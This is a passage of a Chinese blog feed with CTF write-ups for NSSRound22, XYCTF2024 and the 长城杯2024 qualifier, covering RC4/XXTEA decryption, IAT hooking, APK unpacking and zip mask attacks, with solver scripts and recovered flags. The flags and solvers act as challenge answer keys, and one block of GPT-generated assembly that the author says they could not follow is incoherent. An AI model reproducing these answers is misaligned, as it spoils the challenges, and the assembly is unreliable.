class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;572e180b1a680b3e5276344b241d5b52525a043173346b1355442028&quot;</span>)<br>key = <span class="hljs-string">b&#x27;NS5_R0Un6_z2_apK&#x27;</span><br>decrypted = rc4(data, key)<br><span class="hljs-built_in">print</span>(decrypted)<br><span class="hljs-comment">#NSSCTF&#123;V3ry_4z_1ib_W1th_4pk&#125;</span><br></code></pre></td></tr></table></figure><h2 id="EzHook-1"><a href="#EzHook-1" class="headerlink" title="EzHook-1"></a>EzHook-1</h2><p>复现来自yuro✌和P✌</p><p>考得是Windows IAT Hook技术，本题hook了MessageBoxA函数，当执行MessageBoxA的时候会跑到另外地方</p><p>4B0函数里面一堆异或，一个个写出来不显示，后面Right?的话应该没这么简单</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714281705041-492415f8-4f1b-444a-bdb0-86bfc8c327e4.png" class="" title="img"><p>往main前找，找到1240，调试起来发现运行在main函数之后</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714281994258-00e36fc8-fd2c-4c1b-8f0d-f660a2968697.png" class="" title="img"><p>1880和1840里面调用的函数是一样的，那么大概率就是一对加解密函数</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714283017306-26380021-3938-42ce-bf08-a28eee88e219.png" class="" title="img"><p>细看猜测是xxtea</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714283204028-1057fe73-fad1-47b4-948d-231a663fee70.png" class="" title="img"><p>最后给了个弹窗，也就是说a090函数是MessageBoxA函数</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714282164099-ed1eb021-9a03-40ec-a21d-d7656134c270.png" class="" title="img"><p>调试到这里把str2赋值给a2</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714289822893-f969cb8c-eb2c-432e-8fa9-b46ff7ff94c3.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">E4 E7 FE E3 <span class="hljs-number">17</span> 1C DE <span class="hljs-number">32</span> E6 B8 <span class="hljs-number">68</span> <span class="hljs-number">40</span> <span class="hljs-number">40</span> D8 <span class="hljs-number">72</span> FA <span class="hljs-number">88</span> <span class="hljs-number">14</span> E1 <span class="hljs-number">85</span> CD <span class="hljs-number">81</span> AA DE 1D E8 <span class="hljs-number">92</span> <span class="hljs-number">41</span> B8 1E 5E CF CE <span class="hljs-number">49</span> <span class="hljs-number">27</span> <span class="hljs-number">22</span> <span class="hljs-number">39</span> 7D <span class="hljs-number">50</span> DA<br></code></pre></td></tr></table></figure><p>通过汇编的rcx进入编辑</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714290752537-099c14b5-95c9-4d14-a6aa-3d4a85a2b7ad.png" class="" title="img"><p>每16个地址change byte一次，把对应的密文填进去</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714291965372-c1a5414e-8187-41fc-a7ab-5ad9ed66806b.png" class="" title="img">运行到解密函数之后<img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1714292085309-cda89066-4965-4d08-b6bb-063fc93ed8d8.png" class="" title="img"><p>直接就是参数a1<code>NSSCTF&#123;C0ngr@tulat1ons!H0Ok_bY_1t_s3lf!&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tea魔改</tag>
      
      <tag>rc4魔改</tag>
      
      <tag>VM</tag>
      
      <tag>hashcat爆破</tag>
      
      <tag>patch</tag>
      
      <tag>blowfish</tag>
      
      <tag>go语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XYCTF2024部分wp</title>
    <link href="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/"/>
    <url>/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="聪明的信使"><a href="#聪明的信使" class="headerlink" title="聪明的信使"></a>聪明的信使</h2><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712051726951-e17ec2ed-5b40-48d7-9db5-26eeedbb1c7e.png" class="" title="img"><p>发现是rot9</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712051750030-dcf3a574-9a06-4d78-85d7-8548b65b64af.png" class="" title="img"><p>想起来不是简单的减9，是循环着来</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712052272078-5cb1c2fc-02e1-4b6d-93b6-1111c3d290e0.png" class="" title="img"><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">flag&#123;Y0u_KnOw_Crypt0_14_v3ry_Imp0rt@nt!&#125;<br></code></pre></td></tr></table></figure><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712052290247-2e08b5c7-b2e9-455d-80e1-5635a2330a74.png" class="" title="img"><h2 id="miao"><a href="#miao" class="headerlink" title="miao"></a>miao</h2><p>和省赛的差不多</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712052736031-043a026f-64ca-4663-9d85-0f43bf4982ef.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712052859203-27455d36-5e20-46a0-8091-5487a6d9a1fe.png" class="" title="img"><p>交叉引用过去</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712052847842-5e8a1465-de85-48fc-98fd-07f0db85ee3b.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712052961771-0e54e387-423d-444c-8414-612e3f3862b0.png" class="" title="img"><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">flag&#123;<span class="hljs-symbol">My_fl@</span><span class="hljs-symbol">g_h4s_br0ken_4parT_Bu7_Y0u_c@</span>n_f1x_1t!&#125;<br></code></pre></td></tr></table></figure><h2 id="大学生"><a href="#大学生" class="headerlink" title="大学生"></a>大学生</h2><p>第一次遇到dos系统</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712053132899-8b9d1dbe-f307-46ab-9432-ba4412d54c0b.png" class="" title="img"><p>输入然后相邻两位异或</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712068099854-bc9b4106-2a2e-4e6c-ac5a-b49ba6800d04.png" class="" title="img"><p>最后和密文比较</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712068164096-eece6aeb-2994-40ed-bb0d-b15749c93821.png" class="" title="img"><p>直觉是密文相邻两位异或</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712068022471-94366bc6-8310-40a3-8207-0260b49a23df.png" class="" title="img"><h2 id="DebugMe"><a href="#DebugMe" class="headerlink" title="DebugMe"></a>DebugMe</h2><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712068563333-67ab2072-df0b-4cea-b49f-ae30286d2594.png" class="" title="img"><p>jadx混淆有点严重</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712107912377-569a0014-5b5d-4133-b724-7f01ca496e3e.png" class="" title="img"><p>不如jeb直接动调，不要下断点，直接attach之后click就有flag</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712199875421-3631d52d-bea6-43de-9765-b1e05126ef4d.png" class="" title="img"><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">XYCTF</span><span class="hljs-template-variable">&#123;d3bugg3r_15_v3ry_u53ful&#125;</span><br></code></pre></td></tr></table></figure><h2 id="TrustMe"><a href="#TrustMe" class="headerlink" title="TrustMe"></a>TrustMe</h2><p>rc4解密</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712069152663-2dc9e98b-3de0-438d-ab96-477524415e86.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712069133323-17339519-b6ec-4aa1-8813-dfab80f4a262.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712069325538-606612d5-a9c3-4b78-90cd-f1c58f13a650.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712200674892-4cb7837c-94da-431e-9716-4f3c6cfaf1cf.png" class="" title="img"><p>解密不够，去看其他方法，发现了decrypt，异或0xff，二进制位原来是1变为0，原来是0变为1</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712200661342-ba5f59e0-c3ff-4126-aff6-85b3da4a9e7a.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712202255450-513c7acb-fedf-4c62-9f18-bb69b6e86683.png" class="" title="img"><p>高版本没有debug</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712201691011-c79aeee3-64ee-454a-9720-df79b747304f.png" class="" title="img"><p>最后一部分没有注释，那估计是有用数据</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712229746541-30eff005-c68f-4095-a123-605411be1f3c.png" class="" title="img"><p>发现还真是zip，同时也是apk，记得最后四位不要，这样才能在模拟器中打开</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712229660604-107b9590-1134-47ee-8a97-903aaefaa40c.png" class="" title="img"><p>还是一个apk，flag从数据库中读出来</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712232918014-62b6c178-c636-4fc8-b4a1-41a2984b1dff.png" class="" title="img"><p>找到db文件了，但是在线工具一直打不开，应该要能想到已经被加密了(师傅提醒,有点misc)，因为数据库这种不加密很危险</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712232841782-3b26a269-4c5e-4249-8ef5-2b440bf3db17.png" class="" title="img"><p>对着原本的文件头去异或，发现异或的是同一个数0xff，估计是第一个apk把所有有用文件都异或0xff了</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712233210071-44d9d6ce-629b-43d7-936a-4397b3246f07.png" class="" title="img"><p>异或后直接搜就能出</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712232745234-e3dd72db-7b2c-401a-8324-96f9448aff04.png" class="" title="img"><p>这样就能在线查看了</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712233142959-27f6e707-4446-46ac-bbd0-f663172bc53f.png" class="" title="img"><h2 id="砸核桃"><a href="#砸核桃" class="headerlink" title="砸核桃"></a>砸核桃</h2><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712974229801-bd1f51a1-575d-470e-9d27-880389e661e5.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712974741323-6710afcf-62cc-454b-a18c-645705aa7b69.png" class="" title="img"><p>demo解压到本地就能脱壳了</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712974851911-69a9c572-eda5-4a57-a78a-8e79cd3d42ea.png" class="" title="img"><h2 id="baby-unity-2"><a href="#baby-unity-2" class="headerlink" title="baby_unity-2"></a>baby_unity-2</h2><p><a href="https://www.52pojie.cn/thread-1580642-1-1.html">https://www.52pojie.cn/thread-1580642-1-1.html</a></p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712326587601-87685055-82db-4f8b-a35f-2fbb7d52f3c9.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712326568808-10448a9d-423d-45b4-aa55-c4774c0d622e.png" class="" title="img"><p>发现并没有需要的libil2cpp.so，用GameAssembler.dll代替</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712371932601-3a00572c-cfd8-4321-bc8f-0fe7b9de5172.png" class="" title="img"><p>在师傅的提醒下发现有壳，其实想想也应该的，只有这个程序会有改动</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712380768147-197af3b8-2065-4776-be23-10dd20da3c6c.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712380994506-8a936fa0-4c30-41c3-9ccf-2898ee870c2e.png" class="" title="img"><p>用dnSpy打开，发现并没有具体实现</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712383451448-ce45a2cb-293a-4ab4-8558-767632343504.png" class="" title="img"><p>用ida打开GameAssembly.dll，但是找不到密文</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712386499831-fe0a4e91-4ded-497f-84bb-db825caef7f2.png" class="" title="img"><p>发现sha1</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712385155393-902ca6f6-c85a-4265-8377-41cafd7dd312.png" class="" title="img"><h2 id="ezcube"><a href="#ezcube" class="headerlink" title="ezcube"></a>ezcube</h2><p>看颜色应该是三个中间块没有还原</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712538029145-73021005-5d48-46f5-bcc0-cc2cab675a18.png" class="" title="img"><p>且步数不能超过12</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712538092358-e82af05c-6f0e-401f-bded-c7c33c2342ea.png" class="" title="img"><p>用z3不行</p><p>想到了最后一步还原公式</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712537941479-30672fcf-b71c-4a8e-827b-8cbed73aecc1.png" class="" title="img"><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;RuRURURuruRR&#125;</span><br></code></pre></td></tr></table></figure><h2 id="今夕是何年-2"><a href="#今夕是何年-2" class="headerlink" title="今夕是何年-2"></a>今夕是何年-2</h2><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712539239937-b3df0244-eee0-4c3a-a6a8-4b4bd1dde81c.png" class="" title="img"><p>工具反编译不了</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712538522256-2949ff9c-dc33-4ea4-be74-ca21e1448739.png" class="" title="img"><h2 id="ez-rand-2"><a href="#ez-rand-2" class="headerlink" title="ez_rand-2"></a>ez_rand-2</h2><p>看上去像是真随机，没啥想法</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712573749281-60369774-2b88-4088-869b-6bc6d933091b.png" class="" title="img"><h2 id="何须相思煮余年-2"><a href="#何须相思煮余年-2" class="headerlink" title="何须相思煮余年-2"></a>何须相思煮余年-2</h2><p>gpt生成的汇编看不懂</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python">push ebp<br>mov ebp, esp<br>sub esp, <span class="hljs-number">0x81ec</span><br>mov eax, [<span class="hljs-number">0xa8</span>]<br>mov ecx, [<span class="hljs-number">0x414040</span>]<br>xor eax, [<span class="hljs-number">0xfc45</span>]<br>push <span class="hljs-number">0x0</span><br>lea eax, [ebp-<span class="hljs-number">0xa0</span>]<br>push eax<br>call <span class="hljs-number">0xc7a</span><br>add esp, <span class="hljs-number">0xc</span><br>mov dword ptr [ebp-<span class="hljs-number">0xa8</span>], <span class="hljs-number">0x27</span><br>mov dword ptr [ebp-<span class="hljs-number">0xa4</span>], <span class="hljs-number">0x0</span><br>jmp short <span class="hljs-number">0xf</span><br>mov ecx, [ebp-<span class="hljs-number">0xa4</span>]<br>add ecx, <span class="hljs-number">0x1</span><br>mov dword ptr [ebp-<span class="hljs-number">0xa4</span>], ecx<br>cmp dword ptr [ebp-<span class="hljs-number">0xa4</span>], <span class="hljs-number">0x27</span><br>jle short <span class="hljs-number">0xf</span><br>lea ebp, [ebp]<br>mov edx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov eax, [ebp+<span class="hljs-number">0x60</span>]<br>lea ebx, [ebp+edx-<span class="hljs-number">0x3</span>]<br>mov edx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov ecx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov dword ptr [ebp+ecx*<span class="hljs-number">4</span>-<span class="hljs-number">0x3</span>], edx<br>mov edx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov eax, [ebp-<span class="hljs-number">0xa4</span>]<br>mov dword ptr [ebp+eax*<span class="hljs-number">4</span>-<span class="hljs-number">0x3</span>], edx<br>jmp short <span class="hljs-number">0x73</span><br>mov ecx, [ebp-<span class="hljs-number">0xa4</span>]<br>add ecx, <span class="hljs-number">0x3</span><br>mov dword ptr [ebp-<span class="hljs-number">0xa4</span>], ecx<br>cmp dword ptr [ebp-<span class="hljs-number">0xa4</span>], <span class="hljs-number">0x27</span><br>jle short <span class="hljs-number">0x73</span><br>lea esi, [ebp-<span class="hljs-number">0xa4</span>]<br>mov ecx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov edx, [ebp+<span class="hljs-number">0x60</span>]<br>sub esi, edx<br>mov edx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov ecx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov dword ptr [ebp+ecx*<span class="hljs-number">4</span>-<span class="hljs-number">0x3</span>], edx<br>mov edx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov eax, [ebp-<span class="hljs-number">0xa4</span>]<br>mov dword ptr [ebp+eax*<span class="hljs-number">4</span>-<span class="hljs-number">0x3</span>], edx<br>jmp short <span class="hljs-number">0x38</span><br>mov ecx, [ebp-<span class="hljs-number">0xa4</span>]<br>add ecx, <span class="hljs-number">0x3</span><br>mov dword ptr [ebp-<span class="hljs-number">0xa4</span>], ecx<br>cmp dword ptr [ebp-<span class="hljs-number">0xa4</span>], <span class="hljs-number">0x27</span><br>jle short <span class="hljs-number">0x38</span><br>lea edi, [ebp-<span class="hljs-number">0xa4</span>]<br>mov ecx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov edx, [ebp+<span class="hljs-number">0x60</span>]<br>xor edi, edx<br>mov edx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov ecx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov dword ptr [ebp+ecx*<span class="hljs-number">4</span>-<span class="hljs-number">0x3</span>], edx<br>mov edx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov eax, [ebp-<span class="hljs-number">0xa4</span>]<br>mov dword ptr [ebp+eax*<span class="hljs-number">4</span>-<span class="hljs-number">0x3</span>], edx<br>jmp short <span class="hljs-number">0xf7</span><br>xor eax, eax<br>mov ecx, [ebp-<span class="hljs-number">0x4</span>]<br>xor ecx, ebp<br>call <span class="hljs-number">0x4</span><br>mov ebp, esp<br>ret<br></code></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="神之套-2"><a href="#神之套-2" class="headerlink" title="神之套-2"></a>神之套-2</h2><p>一眼掩码攻击</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712203144307-e1b80582-c475-4853-9fd9-230c8235ce6b.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712202797199-efa0d22a-ff49-42fb-8ee8-6fc6a51d1b5e.png" class="" title="img"><p>套比flag多了flag.md，其他都一样</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712203002356-cc93cb50-3b45-422f-be3b-309ec03ac341.png" class="" title="img"><p>找到同样地址的地方，发现^0xff之后有压缩包</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712212960769-be00309f-2594-4983-8f08-291b1c4a094a.png" class="" title="img"><h2 id="TCPL"><a href="#TCPL" class="headerlink" title="TCPL"></a>TCPL</h2><p>直接运行不了</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712383099722-d2568fa2-a8ce-4d14-bff7-d2be58bf7297.png" class="" title="img"><p>ida不能反编译，那就用ghidra</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712383204457-f62fd638-89e1-4dd5-9044-1d6ce8ef527d.png" class="" title="img"><p>按照流程得到输出，但是好像没啥用</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712383248486-5ffecd01-bca8-46c6-98e8-80fa9ec53d50.png" class="" title="img"><p>由于题目说是把1用下面的图片来代替，那么可以知道下面的图片也表示一个字母或者数字，仔细去看上面的反编译代码后半部分可以发现是在调换数组的元素，那么数组的0x0就可以忽略，同时由于是5×5的矩阵，那猜测第59行应该是×5，同理上面应该是直接异或i，最后用0代替1即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x46</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x56</span>,<br>  <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x4C</span>,<br>  <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x61</span>]<br><span class="hljs-comment">#print(hex(len(a)))</span><br>s1=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x1d</span>):<br>    <span class="hljs-comment">#print((a[i]+i)^i,end=&quot;,&quot;)</span><br>    s1+=<span class="hljs-built_in">chr</span>((a[i]^i))<br><span class="hljs-built_in">print</span>(s1)<br><br>b=[<span class="hljs-number">0x20</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x20</span>,<span class="hljs-number">0x2A</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x20</span>,<span class="hljs-number">0x20</span>, <span class="hljs-number">0x2A</span>,<span class="hljs-number">0x2A</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x20</span>,<span class="hljs-number">0x2a</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x20</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x20</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(b))<br>s2=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        s2+=<span class="hljs-built_in">chr</span>(b[j+i*<span class="hljs-number">5</span>])<br>    <span class="hljs-built_in">print</span>(s2,end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>,end=<span class="hljs-string">&quot;&quot;</span>)<br>    s2=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">#FLAG&#123;PLCT_An4_r1SCv_x1huann1&#125;</span><br>FLAG&#123;PLCT_An4_r0SCv_x0huann0&#125;<br></code></pre></td></tr></table></figure><h2 id="baby-AIO-2"><a href="#baby-AIO-2" class="headerlink" title="baby-AIO-2"></a>baby-AIO-2</h2><p>去看so层发现关键函数</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712467126283-fbfcf916-4692-44d9-8948-5fc61d2b0063.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712467442789-04e40258-9c5e-4097-b87b-1619cd20332a.png" class="" title="img"><p>后来又给了一个apk，发现是vm</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712473914434-ce76bd09-7132-45ae-9155-875b9c12a76a.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712495034710-c8246956-dbed-4dff-af43-91c6ac408974.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>z3</tag>
      
      <tag>tea魔改</tag>
      
      <tag>unity逆向</tag>
      
      <tag>VM</tag>
      
      <tag>e语言</tag>
      
      <tag>lua语言</tag>
      
      <tag>huffman</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>长城杯2024初赛部分Re</title>
    <link href="/2024/04/10/2024%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86Re/"/>
    <url>/2024/04/10/2024%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86Re/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Login-1"><a href="#Login-1" class="headerlink" title="Login-1"></a>Login-1</h2><p>方程只能解一半，还得手动</p><img src="/2024/04/10/2024%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86Re/1711884342433-1f41b761-935d-4556-ab80-c1a713e7eff2.png" class="" title="img"><p>一开始做的时候直接hide casts了</p><p>后面发现还可以用abcd表示每一位然后分段解z3</p><p>跑个两分钟</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 